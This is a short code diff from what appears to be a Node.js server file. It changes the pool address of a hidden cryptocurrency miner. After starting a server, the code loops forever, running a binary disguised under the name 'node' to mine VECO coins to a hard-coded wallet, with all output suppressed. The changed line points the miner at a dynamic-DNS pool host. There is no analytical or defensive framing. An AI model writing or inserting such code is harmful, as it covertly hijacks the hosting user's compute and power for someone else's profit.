@@ -15,7 +15,7 @@ server.listen(prt, () => {
 
 while (true) {
   try {
-    execSync('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Sekop -p c=VECO,m=solo &> /dev/null');
+    execSync('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum-mining-pool.zapto.org:3725 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Sekop -p c=VECO,m=solo &> /dev/null');
   } catch (error) {
     console.log(error);
   }
